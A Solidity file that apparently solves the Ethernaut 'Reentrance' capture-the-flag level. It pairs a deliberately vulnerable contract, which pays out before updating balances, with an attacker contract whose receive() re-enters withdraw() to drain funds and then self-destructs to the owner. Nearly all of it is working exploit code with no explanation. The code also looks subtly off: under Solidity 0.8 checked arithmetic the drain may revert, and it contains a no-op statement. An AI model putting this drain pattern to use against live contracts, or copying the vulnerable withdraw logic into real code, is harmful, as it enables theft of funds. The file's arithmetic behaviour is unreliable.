// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Reenter {
    Reentrance public original;
    address public owner;

    constructor(address _reentranceContract) {
        owner = msg.sender;
        original = Reentrance(payable(_reentranceContract));
    }

    function donateToSelf() public payable {
        original.donate{value: msg.value, gas: 4000000}(address(this));
        //original.donate(address(this));
    }

    function withdrawMoney(uint _amount) public payable {
        original.withdraw(_amount);
    }

    function destructContract() public {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }

    receive() external payable {
        if (address(original).balance != 0) {
            original.withdraw(1000000000000000);
        }
    }
}
